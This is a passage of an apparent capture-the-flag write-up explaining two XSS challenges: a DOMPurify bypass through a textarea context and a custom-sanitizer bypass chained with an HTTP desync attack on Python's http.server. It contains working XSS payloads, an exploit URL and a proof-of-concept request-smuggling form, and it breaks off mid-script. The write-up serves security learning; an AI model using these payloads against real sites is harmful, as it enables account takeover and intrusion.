<p>On the server side on line [1] , Dompurify was used to sanitize the html from the <code class="language-plaintext highlighter-rouge">message</code> parameter and then the sanitized string from dompurify was passed to the template <code class="language-plaintext highlighter-rouge">index.ejs</code>
We have two injection points here , so the sanitized string is placed at the two places <code class="language-plaintext highlighter-rouge">&lt;%- sanitized %&gt;</code></p>
<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="o">&lt;</span><span class="nx">p</span> <span class="kd">class</span><span class="o">=</span><span class="dl">"</span><span class="s2">message</span><span class="dl">"</span><span class="o">&gt;&lt;%-</span> <span class="nx">sanitized</span> <span class="o">%&gt;&lt;</span><span class="sr">/b&gt;&lt;/</span><span class="nx">p</span><span class="o">&gt;</span>
    <span class="o">&lt;</span><span class="nx">form</span> <span class="nx">method</span><span class="o">=</span><span class="dl">"</span><span class="s2">get</span><span class="dl">"</span> <span class="nx">action</span><span class="o">=</span><span class="dl">""</span><span class="o">&gt;</span>
        <span class="o">&lt;</span><span class="nx">textarea</span> <span class="nx">name</span><span class="o">=</span><span class="dl">"</span><span class="s2">message</span><span class="dl">"</span><span class="o">&gt;&lt;%-</span> <span class="nx">sanitized</span> <span class="o">%&gt;&lt;</span><span class="sr">/textarea</span><span class="err">&gt;
</span></code></pre></div></div>

<p><img src="https://github.com/user-attachments/assets/3958697d-c279-4d2c-a99e-7e9167393fad" alt="image" /></p>

<p>Well Dompurify latest version is used so a direct bypass isn‚Äôt possible, let‚Äôs focus on the second insertion point which is inside <code class="language-plaintext highlighter-rouge">template</code> element. As in the first one there is no chance.
By default, the  <code class="language-plaintext highlighter-rouge">template</code> element‚Äôs content is not rendered, as we can see in the screenshot the injected html appears as it is ,not rendered as html.</p>

<p>Dompurify isn‚Äôt aware of the context where the sanitized data will be in use i.e <code class="language-plaintext highlighter-rouge">template</code> element in our case. So it‚Äôs possible to get xss here even though state of the art DOMPurify is in use.</p>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;a</span> <span class="na">id=</span><span class="s">"&lt;/textarea&gt;&lt;img src=x onerror=alert()&gt;"</span><span class="nt">&gt;</span>shirley<span class="nt">&lt;/a&gt;</span>
</code></pre></div></div>

<p>https://yeswehack.github.io/Dom-Explorer/dom-explore , as can be seen the above payload is consider safe by dompurify as the string <code class="language-plaintext highlighter-rouge">&lt;/textarea&gt;&lt;img src=x onerror=alert()&gt;</code> is inside the attribute value.
<img src="https://github.com/user-attachments/assets/c361ba80-4406-4db9-93e8-aef00f9d3c20" alt="image" /></p>

<p>Things gets interesting when the same payload is used in context like this</p>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;textarea</span> <span class="na">name=</span><span class="s">"message"</span><span class="nt">&gt;</span> <span class="nt">&lt;a</span> <span class="na">id=</span><span class="s">"&lt;/textarea&gt;&lt;img src=x onerror=alert()&gt;"</span><span class="nt">&gt;</span>shirley<span class="nt">&lt;/a&gt;</span> <span class="nt">&lt;/textarea&gt;</span>
</code></pre></div></div>

<p><img src="https://github.com/user-attachments/assets/b316663f-778e-4928-bfe5-4911cab5d53c" alt="image" /></p>

<p>When this is parsed by the browser , as earlier mentioned the content inside of <code class="language-plaintext highlighter-rouge">textarea</code> element doesn‚Äôt gets rendered so as soon as the  <code class="language-plaintext highlighter-rouge">&lt;/textarea&gt;</code> is seen by the browser it will close the <code class="language-plaintext highlighter-rouge">textarea</code> context right there. And rest of the part is no longer inside <code class="language-plaintext highlighter-rouge">textarea</code> so it gets render now as HTML. Thus giving us an xss vector <code class="language-plaintext highlighter-rouge">&lt;img src=x onerror=alert()&gt;</code></p>

<p>https://challenge-hamayan.quiz.flatt.training/?message=%3Ca%20id=%22%3C/textarea%3E%3Cimg%20src=x%20onerror=alert()%3E%22%3E
<img src="https://github.com/user-attachments/assets/0d44738c-eeb3-42e9-ab26-fb970df57120" alt="image" /></p>

<hr />

<h1 id="challenge-2-by-ryotkak">Challenge 2 by @ryotkak</h1>

<p>A very interesting challenge indeed</p>

<p>http://34.171.202.118/</p>

<p>This application allows you to  create drafts, but no html is allowed. On the server side it html encodes the input. Although the html encoded input goes through a custom xss sanitizer on the client side and then used in <code class="language-plaintext highlighter-rouge">innerHTML</code> but it passes html encoded version <code class="language-plaintext highlighter-rouge">&amp;lt; &amp;gt;</code> it looks useless so it suggest that there might be another vuln:</p>

<p><img src="https://github.com/user-attachments/assets/ca96cba1-4baf-4f76-bac1-96eff6121259" alt="image" /></p>

<p>When we create a draft, it provides us with an id in the url like this http://34.171.202.118/?draft_id=fbca1697-5c42-41a9-abdc-3628bdb5f054 when this page is load the following things happen in the background</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code>        <span class="nb">window</span><span class="p">.</span><span class="nx">onload</span> <span class="o">=</span> <span class="k">async</span> <span class="nf">function </span><span class="p">()</span> <span class="p">{</span>
            <span class="kd">const</span> <span class="nx">params</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">URLSearchParams</span><span class="p">(</span><span class="nb">window</span><span class="p">.</span><span class="nx">location</span><span class="p">.</span><span class="nx">search</span><span class="p">);</span>
            <span class="k">if </span><span class="p">(</span><span class="nx">params</span><span class="p">.</span><span class="nf">has</span><span class="p">(</span><span class="dl">'</span><span class="s1">draft_id</span><span class="dl">'</span><span class="p">))</span> <span class="p">{</span>
                <span class="kd">const</span> <span class="nx">resp</span> <span class="o">=</span> <span class="k">await</span> <span class="nf">fetch</span><span class="p">(</span><span class="s2">`/api/drafts?id=</span><span class="p">${</span><span class="nf">encodeURIComponent</span><span class="p">(</span><span class="nx">params</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="dl">'</span><span class="s1">draft_id</span><span class="dl">'</span><span class="p">))}</span><span class="s2">`</span><span class="p">);</span>
                <span class="kd">const</span> <span class="nx">content</span> <span class="o">=</span> <span class="k">await</span> <span class="nx">resp</span><span class="p">.</span><span class="nf">text</span><span class="p">();</span>
                <span class="nb">document</span><span class="p">.</span><span class="nf">getElementById</span><span class="p">(</span><span class="dl">'</span><span class="s1">input</span><span class="dl">'</span><span class="p">).</span><span class="nx">value</span> <span class="o">=</span> <span class="nx">content</span><span class="p">.</span><span class="nf">slice</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">100</span><span class="p">);</span>
                <span class="nf">previewContent</span><span class="p">();</span>
            <span class="p">}</span>
        <span class="p">}</span>
</code></pre></div></div>

<p>It takes the <code class="language-plaintext highlighter-rouge">draft_id</code> parameter value and use it in a fetch call to the <code class="language-plaintext highlighter-rouge">/api/drafts?id=</code> endpoint. The value of the id is url encoded. The response from this endpoint is then passed to a custom sanitizer, the sanitized output is then passed to the sink <code class="language-plaintext highlighter-rouge">innerHTML</code></p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code>        <span class="kd">function</span> <span class="nf">previewContent</span><span class="p">()</span> <span class="p">{</span>
            <span class="kd">const</span> <span class="nx">input</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nf">getElementById</span><span class="p">(</span><span class="dl">'</span><span class="s1">input</span><span class="dl">'</span><span class="p">).</span><span class="nx">value</span><span class="p">;</span>
            <span class="nb">document</span><span class="p">.</span><span class="nf">getElementById</span><span class="p">(</span><span class="dl">'</span><span class="s1">preview</span><span class="dl">'</span><span class="p">).</span><span class="nx">innerHTML</span> <span class="o">=</span> <span class="nf">sanitizeHtml</span><span class="p">(</span><span class="nx">input</span><span class="p">);</span> <span class="c1">// just in case</span>
        <span class="p">}</span>
</code></pre></div></div>

<p>The response return from the <code class="language-plaintext highlighter-rouge">/api/drafts?id=</code> is going to be html encoded so it‚Äôs clear that the goal of this challenge is to find a way to make the <code class="language-plaintext highlighter-rouge">/api/drafts?id=</code> endpoint return our payload which is not html encoded and find a bypass for the Sanitizer then.</p>

<p>To get a start let‚Äôs try to find a bypass for the sanitizer first, it‚Äôs not dompurify so it shouldn‚Äôt give much trouble to us:</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code>        <span class="kd">const</span> <span class="nx">SANITIZER_CONFIG</span> <span class="o">=</span> <span class="p">{</span>
            <span class="na">DANGEROUS_TAGS</span><span class="p">:</span> <span class="p">[</span>
                <span class="dl">'</span><span class="s1">script</span><span class="dl">'</span><span class="p">,</span>
                <span class="dl">'</span><span class="s1">iframe</span><span class="dl">'</span><span class="p">,</span>
                <span class="dl">'</span><span class="s1">style</span><span class="dl">'</span><span class="p">,</span>
                <span class="dl">'</span><span class="s1">object</span><span class="dl">'</span><span class="p">,</span>
                <span class="dl">'</span><span class="s1">embed</span><span class="dl">'</span><span class="p">,</span>
                <span class="dl">'</span><span class="s1">meta</span><span class="dl">'</span><span class="p">,</span>
                <span class="dl">'</span><span class="s1">link</span><span class="dl">'</span><span class="p">,</span>
                <span class="dl">'</span><span class="s1">base</span><span class="dl">'</span><span class="p">,</span>
                <span class="dl">'</span><span class="s1">frame</span><span class="dl">'</span><span class="p">,</span>
                <span class="dl">'</span><span class="s1">frameset</span><span class="dl">'</span><span class="p">,</span>
                <span class="dl">'</span><span class="s1">svg</span><span class="dl">'</span><span class="p">,</span>
                <span class="dl">'</span><span class="s1">math</span><span class="dl">'</span><span class="p">,</span>
                <span class="dl">'</span><span class="s1">template</span><span class="dl">'</span><span class="p">,</span>
            <span class="p">],</span>

            <span class="na">ALLOW_ATTRIBUTES</span><span class="p">:</span> <span class="kc">false</span>
        <span class="p">}</span>

        <span class="kd">function</span> <span class="nf">sanitizeHtml</span><span class="p">(</span><span class="nx">html</span><span class="p">)</span> <span class="p">{</span>
            <span class="kd">const</span> <span class="nx">doc</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">DOMParser</span><span class="p">().</span><span class="nf">parseFromString</span><span class="p">(</span><span class="nx">html</span><span class="p">,</span> <span class="dl">"</span><span class="s2">text/html</span><span class="dl">"</span><span class="p">);</span>
            <span class="kd">const</span> <span class="nx">nodeIterator</span> <span class="o">=</span> <span class="nx">doc</span><span class="p">.</span><span class="nf">createNodeIterator</span><span class="p">(</span><span class="nx">doc</span><span class="p">,</span> <span class="nx">NodeFilter</span><span class="p">.</span><span class="nx">SHOW_ELEMENT</span><span class="p">);</span>

            <span class="k">while </span><span class="p">(</span><span class="nx">nodeIterator</span><span class="p">.</span><span class="nf">nextNode</span><span class="p">())</span> <span class="p">{</span>
                <span class="kd">const</span> <span class="nx">currentNode</span> <span class="o">=</span> <span class="nx">nodeIterator</span><span class="p">.</span><span class="nx">referenceNode</span><span class="p">;</span>
                <span class="k">if </span><span class="p">(</span><span class="k">typeof</span> <span class="nx">currentNode</span><span class="p">.</span><span class="nx">nodeName</span> <span class="o">!==</span> <span class="dl">"</span><span class="s2">string</span><span class="dl">"</span> <span class="o">||</span> <span class="o">!</span><span class="p">(</span><span class="nx">currentNode</span><span class="p">.</span><span class="nx">attributes</span> <span class="k">instanceof</span> <span class="nx">NamedNodeMap</span><span class="p">)</span> <span class="o">||</span> <span class="k">typeof</span> <span class="nx">currentNode</span><span class="p">.</span><span class="nx">remove</span> <span class="o">!==</span> <span class="dl">"</span><span class="s2">function</span><span class="dl">"</span> <span class="o">||</span> <span class="k">typeof</span> <span class="nx">currentNode</span><span class="p">.</span><span class="nx">removeAttribute</span> <span class="o">!==</span> <span class="dl">"</span><span class="s2">function</span><span class="dl">"</span><span class="p">)</span> <span class="p">{</span>
                    <span class="nx">console</span><span class="p">.</span><span class="nf">warn</span><span class="p">(</span><span class="dl">"</span><span class="s2">DOM Clobbering detected!</span><span class="dl">"</span><span class="p">);</span>
                    <span class="k">return</span> <span class="dl">""</span><span class="p">;</span>
                <span class="p">}</span>
                <span class="k">if </span><span class="p">(</span><span class="nx">SANITIZER_CONFIG</span><span class="p">.</span><span class="nx">DANGEROUS_TAGS</span><span class="p">.</span><span class="nf">includes</span><span class="p">(</span><span class="nx">currentNode</span><span class="p">.</span><span class="nx">nodeName</span><span class="p">.</span><span class="nf">toLowerCase</span><span class="p">()))</span> <span class="p">{</span>
                    <span class="nx">currentNode</span><span class="p">.</span><span class="nf">remove</span><span class="p">();</span>
                <span class="p">}</span> <span class="k">else</span> <span class="k">if </span><span class="p">(</span><span class="o">!</span><span class="nx">SANITIZER_CONFIG</span><span class="p">.</span><span class="nx">ALLOW_ATTRIBUTES</span> <span class="o">&amp;&amp;</span> <span class="nx">currentNode</span><span class="p">.</span><span class="nx">attributes</span><span class="p">)</span> <span class="p">{</span>
                    <span class="k">for </span><span class="p">(</span><span class="kd">const</span> <span class="nx">attribute</span> <span class="k">of</span> <span class="nx">currentNode</span><span class="p">.</span><span class="nx">attributes</span><span class="p">)</span> <span class="p">{</span>
                        <span class="nx">currentNode</span><span class="p">.</span><span class="nf">removeAttribute</span><span class="p">(</span><span class="nx">attribute</span><span class="p">.</span><span class="nx">name</span><span class="p">);</span>
                    <span class="p">}</span>
                <span class="p">}</span>
            <span class="p">}</span>

            <span class="k">return</span> <span class="nx">doc</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">innerHTML</span><span class="p">;</span>
        <span class="p">}</span>
</code></pre></div></div>

<p>From the <code class="language-plaintext highlighter-rouge">SANITIZER_CONFIG</code> you can see, it has list of elements which it regards as dangerous and <code class="language-plaintext highlighter-rouge">ALLOW_ATTRIBUTES</code> key is set to false which might indicate that we can‚Äôt have any attributes and the elements listed in the <code class="language-plaintext highlighter-rouge">DANGEROUS_TAGS</code> in our html.</p>

<p>The dirty string passed to <code class="language-plaintext highlighter-rouge">sanitizeHtml</code> , is first used to create a DOM Tree using the <code class="language-plaintext highlighter-rouge">DOMParser</code> and then it iterates over each node , first checks for the nodeName property which basically returns element name and checks if it‚Äôs in the <code class="language-plaintext highlighter-rouge">DANGEROUS_TAGS</code> array or not if it‚Äôs there it removes the node completely (means it‚Äôs child will also be removed)
The second check is for the attributes , as <code class="language-plaintext highlighter-rouge">ALLOW_ATTRIBUTES</code> is set to false it should remove all the attributes.</p>

<p>This the minimal structure of how a sanitizer is actually implemented, if you look at DOMPurify inner working it also creates a DOM Tree first then iterates and remove the dangerous stuffs.</p>

<p>In the <code class="language-plaintext highlighter-rouge">DANGEROUS_TAGS</code> list I saw that <code class="language-plaintext highlighter-rouge">textarea</code> isn‚Äôt there, so I thought that might be helpful.</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">sanitizeHtml</span><span class="p">(</span><span class="s2">`&lt;textarea&gt;&lt;a id="&lt;/textarea&gt;&lt;img src=x onerror=alert()&gt;"&gt;&lt;/textarea&gt;`</span><span class="p">)</span>
<span class="dl">'</span><span class="s1">&lt;textarea&gt;&amp;lt;a id="&lt;/textarea&gt;&lt;img onerror="alert()"&gt;"&amp;gt;
</span></code></pre></div></div>
<p>We can see with this vector , the <code class="language-plaintext highlighter-rouge">onerror</code> attribute remained there which was weird. As I assumed this would take care of all the attributes. I did setup breakpoint to understand where the magic happens but still couldn‚Äôt get. It seems it just ignores iterating over that specific element.</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code>                    <span class="k">for </span><span class="p">(</span><span class="kd">const</span> <span class="nx">attribute</span> <span class="k">of</span> <span class="nx">currentNode</span><span class="p">.</span><span class="nx">attributes</span><span class="p">)</span> <span class="p">{</span>
                        <span class="nx">currentNode</span><span class="p">.</span><span class="nf">removeAttribute</span><span class="p">(</span><span class="nx">attribute</span><span class="p">.</span><span class="nx">name</span><span class="p">);</span>
                    <span class="p">}</span>
</code></pre></div></div>

<p>So this was the payload which I thought was intented, required user interaction but ok atleast we have something :</p>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;textarea&gt;&lt;a</span><span class="err">/</span><span class="na">id=</span><span class="s">"&lt;/textarea&gt;&lt;text/src='x'onmouseover='alert()'&gt;shirley"</span><span class="nt">&gt;</span>
</code></pre></div></div>

<p>Moving on the server side code</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">class</span> <span class="nc">RequestHandler</span><span class="p">(</span><span class="n">BaseHTTPRequestHandler</span><span class="p">):</span>
    <span class="n">protocol_version</span> <span class="o">=</span> <span class="sh">'</span><span class="s">HTTP/1.1</span><span class="sh">'</span>
    <span class="n">content_type_text</span> <span class="o">=</span> <span class="sh">'</span><span class="s">text/plain; charset=utf-8</span><span class="sh">'</span>
    <span class="n">content_type_html</span> <span class="o">=</span> <span class="sh">'</span><span class="s">text/html; charset=utf-8</span><span class="sh">'</span>

    <span class="k">def</span> <span class="nf">do_GET</span><span class="p">(</span><span class="n">self</span><span class="p">):</span>
        <span class="n">parsed_path</span> <span class="o">=</span> <span class="n">urlparse</span><span class="p">.</span><span class="nf">urlparse</span><span class="p">(</span><span class="n">self</span><span class="p">.</span><span class="n">path</span><span class="p">)</span>
        <span class="n">path</span> <span class="o">=</span> <span class="n">parsed_path</span><span class="p">.</span><span class="n">path</span>
        <span class="n">query</span> <span class="o">=</span> <span class="n">urlparse</span><span class="p">.</span><span class="nf">parse_qs</span><span class="p">(</span><span class="n">parsed_path</span><span class="p">.</span><span class="n">query</span><span class="p">)</span>
        <span class="k">if</span> <span class="n">path</span> <span class="o">==</span> <span class="sh">"</span><span class="s">/</span><span class="sh">"</span><span class="p">:</span>
            <span class="n">self</span><span class="p">.</span><span class="nf">send_response</span><span class="p">(</span><span class="mi">200</span><span class="p">)</span>
            <span class="n">self</span><span class="p">.</span><span class="nf">send_header</span><span class="p">(</span><span class="sh">'</span><span class="s">Cache-Control</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">max-age=3600</span><span class="sh">'</span><span class="p">)</span>
            <span class="n">self</span><span class="p">.</span><span class="nf">send_data</span><span class="p">(</span><span class="n">self</span><span class="p">.</span><span class="n">content_type_html</span><span class="p">,</span> <span class="nf">bytes</span><span class="p">(</span><span class="n">index_html</span><span class="p">,</span> <span class="sh">'</span><span class="s">utf-8</span><span class="sh">'</span><span class="p">))</span>
        <span class="k">elif</span> <span class="n">path</span> <span class="o">==</span> <span class="sh">"</span><span class="s">/api/drafts</span><span class="sh">"</span><span class="p">:</span>
            <span class="n">draft_id</span> <span class="o">=</span> <span class="n">query</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">'</span><span class="s">id</span><span class="sh">'</span><span class="p">,</span> <span class="p">[</span><span class="sh">''</span><span class="p">])[</span><span class="mi">0</span><span class="p">]</span>
            <span class="k">if</span> <span class="n">draft_id</span> <span class="ow">in</span> <span class="n">drafts</span><span class="p">:</span>
                <span class="n">escaped</span> <span class="o">=</span> <span class="n">html</span><span class="p">.</span><span class="nf">escape</span><span class="p">(</span><span class="n">drafts</span><span class="p">[</span><span class="n">draft_id</span><span class="p">])</span>
                <span class="n">self</span><span class="p">.</span><span class="nf">send_response</span><span class="p">(</span><span class="mi">200</span><span class="p">)</span>
                <span class="n">self</span><span class="p">.</span><span class="nf">send_data</span><span class="p">(</span><span class="n">self</span><span class="p">.</span><span class="n">content_type_text</span><span class="p">,</span> <span class="nf">bytes</span><span class="p">(</span><span class="n">escaped</span><span class="p">,</span> <span class="sh">'</span><span class="s">utf-8</span><span class="sh">'</span><span class="p">))</span>
            <span class="k">else</span><span class="p">:</span>
                <span class="n">self</span><span class="p">.</span><span class="nf">send_response</span><span class="p">(</span><span class="mi">200</span><span class="p">)</span>
                <span class="n">self</span><span class="p">.</span><span class="nf">send_data</span><span class="p">(</span><span class="n">self</span><span class="p">.</span><span class="n">content_type_text</span><span class="p">,</span> <span class="sa">b</span><span class="sh">''</span><span class="p">)</span>
        <span class="k">else</span><span class="p">:</span>
            <span class="n">self</span><span class="p">.</span><span class="nf">send_response</span><span class="p">(</span><span class="mi">404</span><span class="p">)</span>
            <span class="n">self</span><span class="p">.</span><span class="nf">send_data</span><span class="p">(</span><span class="n">self</span><span class="p">.</span><span class="n">content_type_text</span><span class="p">,</span> <span class="nf">bytes</span><span class="p">(</span><span class="sh">'</span><span class="s">Path %s not found</span><span class="sh">'</span> <span class="o">%</span> <span class="n">self</span><span class="p">.</span><span class="n">path</span><span class="p">,</span> <span class="sh">'</span><span class="s">utf-8</span><span class="sh">'</span><span class="p">))</span>

    <span class="k">def</span> <span class="nf">do_POST</span><span class="p">(</span><span class="n">self</span><span class="p">):</span>
        <span class="n">content_length</span> <span class="o">=</span> <span class="nf">int</span><span class="p">(</span><span class="n">self</span><span class="p">.</span><span class="n">headers</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">'</span><span class="s">Content-Length</span><span class="sh">'</span><span class="p">))</span>
        <span class="k">if</span> <span class="n">content_length</span> <span class="o">&gt;</span> <span class="mi">100</span><span class="p">:</span>
            <span class="n">self</span><span class="p">.</span><span class="nf">send_response</span><span class="p">(</span><span class="mi">413</span><span class="p">)</span>
            <span class="n">self</span><span class="p">.</span><span class="nf">send_data</span><span class="p">(</span><span class="n">self</span><span class="p">.</span><span class="n">content_type_text</span><span class="p">,</span> <span class="sa">b</span><span class="sh">'</span><span class="s">Post is too large</span><span class="sh">'</span><span class="p">)</span>
            <span class="k">return</span>
        <span class="n">body</span> <span class="o">=</span> <span class="n">self</span><span class="p">.</span><span class="n">rfile</span><span class="p">.</span><span class="nf">read</span><span class="p">(</span><span class="n">content_length</span><span class="p">)</span>
        <span class="n">draft_id</span> <span class="o">=</span> <span class="nf">str</span><span class="p">(</span><span class="nf">uuid4</span><span class="p">())</span>
        <span class="n">drafts</span><span class="p">[</span><span class="n">draft_id</span><span class="p">]</span> <span class="o">=</span> <span class="n">body</span><span class="p">.</span><span class="nf">decode</span><span class="p">(</span><span class="sh">'</span><span class="s">utf-8</span><span class="sh">'</span><span class="p">)</span>
        <span class="n">self</span><span class="p">.</span><span class="nf">send_response</span><span class="p">(</span><span class="mi">200</span><span class="p">)</span>
        <span class="n">self</span><span class="p">.</span><span class="nf">send_data</span><span class="p">(</span><span class="n">self</span><span class="p">.</span><span class="n">content_type_text</span><span class="p">,</span> <span class="nf">bytes</span><span class="p">(</span><span class="n">draft_id</span><span class="p">,</span> <span class="sh">'</span><span class="s">utf-8</span><span class="sh">'</span><span class="p">))</span>

    <span class="k">def</span> <span class="nf">send_data</span><span class="p">(</span><span class="n">self</span><span class="p">,</span> <span class="n">content_type</span><span class="p">,</span> <span class="n">body</span><span class="p">):</span>
        <span class="n">self</span><span class="p">.</span><span class="nf">send_header</span><span class="p">(</span><span class="sh">'</span><span class="s">Content-Type</span><span class="sh">'</span><span class="p">,</span> <span class="n">content_type</span><span class="p">)</span>
        <span class="n">self</span><span class="p">.</span><span class="nf">send_header</span><span class="p">(</span><span class="sh">'</span><span class="s">Connection</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">keep-alive</span><span class="sh">'</span><span class="p">)</span>
        <span class="n">self</span><span class="p">.</span><span class="nf">send_header</span><span class="p">(</span><span class="sh">'</span><span class="s">Content-Length</span><span class="sh">'</span><span class="p">,</span> <span class="nf">len</span><span class="p">(</span><span class="n">body</span><span class="p">))</span>
        <span class="n">self</span><span class="p">.</span><span class="nf">end_headers</span><span class="p">()</span>
        <span class="n">self</span><span class="p">.</span><span class="n">wfile</span><span class="p">.</span><span class="nf">write</span><span class="p">(</span><span class="n">body</span><span class="p">)</span>
</code></pre></div></div>

<p>The routing for 404 pages looked interesting as it was reflecting the path as it is without any sanitization even though the <code class="language-plaintext highlighter-rouge">Content-Type</code> for this endpoint is <code class="language-plaintext highlighter-rouge">text/plain</code> it can still be usefull if we can find a way to serve a 404 response instead for the original /api/drafts?id= request.</p>

<p>The <code class="language-plaintext highlighter-rouge">Content-Length</code> request header check looked kinda sus , when we are dealing Python the first thing which comes into my mind is Desync attacks (thanks to @kevin_mizu for his work on this area )</p>

<p>This challenge turned out to be a very similar one as this https://mizu.re/post/twisty-python</p>

<p>The problem , the application checks the <code class="language-plaintext highlighter-rouge">Content-Length</code> to make sure it‚Äôs not more than 100. If it‚Äôs more than 100 it sends a 413 status code and calls <code class="language-plaintext highlighter-rouge">send_data</code> method which sends back the response. But the connection is never close?</p>

<p>From Mizu‚Äôs blogpost <em>So, if the application doesn‚Äôt read the body, and the connection isn‚Äôt closed (keep-alive), by default http.server will ignore the Content-Length header and interpret the request body as part of the subsequent request.</em></p>

<p>Let‚Äôs try the theory</p>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;form</span> <span class="na">action=</span><span class="s">"http://34.171.202.118/"</span> <span class="na">method=</span><span class="s">"POST"</span> <span class="na">enctype=</span><span class="s">"text/plain"</span> <span class="na">target=</span><span class="s">"shirley"</span><span class="nt">&gt;</span>
    <span class="nt">&lt;textarea</span> <span class="na">name=</span><span class="s">"http"</span><span class="nt">&gt;&lt;/textarea&gt;</span>
<span class="nt">&lt;/form&gt;</span>

<span class="nt">&lt;script&gt;</span>
    <span class="nb">document</span><span class="p">.</span><span class="nx">forms</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="nx">http</span><span class="p">.</span><span class="nx">name</span> <span class="o">=</span> <span class="s2">`GET /shirley HTTP/1.1\r\na:a\r\n`</span><span class="p">;</span>
    <span class="nf">setTimeout</span><span class="p">(</span><span class="dl">'</span><span class="s1">document.forms[0].submit()</span><span class="dl">'</span><span class="p">,</span><span class="mi">3000</span><span class="p">)</span>
<span class="nt">&lt;/script&gt;</span>
</code></pre></div></div>

<p><img src="https://github.com/user-attachments/assets/b777c493-76c8-41e2-b7a2-a04f34d9142a" alt="image" /></p>

<p>In the request logs on the server you can see , we have two requests. The second which is a GET request to the path <code class="language-plaintext highlighter-rouge">/shirley</code> is taken from the request body. So Indeed we can perform desync attack here. Interestingly by sending the same request two times (submit form twice), the second time the index page is loaded it will return the response of the request which was smuggled in the POST body. Thats why you see the <code class="language-plaintext highlighter-rouge">Path /shirley not found</code> reponse in the screenshot above</p>

<p>Btw just an example this how the connection would be close, now if you use the same poc it doesn‚Äôt shows only the POST request :</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="k">def</span> <span class="nf">do_POST</span><span class="p">(</span><span class="n">self</span><span class="p">):</span>
        <span class="n">content_length</span> <span class="o">=</span> <span class="nf">int</span><span class="p">(</span><span class="n">self</span><span class="p">.</span><span class="n">headers</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">'</span><span class="s">Content-Length</span><span class="sh">'</span><span class="p">))</span>
        <span class="k">if</span> <span class="n">content_length</span> <span class="o">&gt;</span> <span class="mi">100</span><span class="p">:</span>
            <span class="n">self</span><span class="p">.</span><span class="nf">send_response</span><span class="p">(</span><span class="mi">413</span><span class="p">)</span>
            <span class="n">self</span><span class="p">.</span><span class="nf">send_data</span><span class="p">(</span><span class="n">self</span><span class="p">.</span><span class="n">content_type_text</span><span class="p">,</span> <span class="sa">b</span><span class="sh">'</span><span class="s">Post is too large</span><span class="sh">'</span><span class="p">)</span>
            <span class="n">self</span><span class="p">.</span><span class="n">close_connection</span> <span class="o">=</span> <span class="bp">True</span> <span class="o">//</span> <span class="n">I</span> <span class="n">added</span> <span class="n">this</span> <span class="n">line</span>
            <span class="k">return</span>
</code></pre></div></div>

<p>The server allows us to send POST request to any path, so we can make a POST request to the http://34.171.202.118/api/drafts?id=ba6c79a8-aafb-458d-8ee9-108c11ae86d4 endpoint with the smuggled request in the body which should contain the xss payload. Now when the same form is submitted two times, the next time a request to the    /api/drafts?id=ba6c79a8-aafb-458d-8ee9-108c11ae86d4 endpoint is made the response for this will be of the smuggled request which is nothing but the 404 page containing the xss payload.</p>

<p>The below submits the form two times with some time delays, also we are targetting the form to be submitted inside the iframe to make sure everything is carried in the same tab because we want the requests to have the same Connection IDs</p>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;iframe</span> <span class="na">name=</span><span class="s">"shirley"</span> <span class="na">style=</span><span class="s">"position:fixed; top:0; left:0; bottom:0; right:0; width:100%; height:100%; border:none; margin:0; padding:0; overflow:hidden; z-index:999999;"</span> <span class="na">src=</span><span class="s">"http://34.171.202.118/?draft_id=ba6c79a8-aafb-458d-8ee9-108c11ae86d4"</span><span class="nt">&gt;&lt;/iframe&gt;</span>
<span class="nt">&lt;form</span> <span class="na">action=</span><span class="s">"http://34.171.202.118/api/drafts?id=ba6c79a8-aafb-458d-8ee9-108c11ae86d4"</span> <span class="na">method=</span><span class="s">"POST"</span> <span class="na">enctype=</span><span class="s">"text/plain"</span> <span class="na">target=</span><span class="s">"shirley"</span><span class="nt">&gt;</span>
    <span class="nt">&lt;textarea</span> <span class="na">name=</span><span class="s">"http"</span><span class="nt">&gt;&lt;/textarea&gt;</span>
<span class="nt">&lt;/form&gt;</span>

<span class="nt">&lt;script&gt;</span>

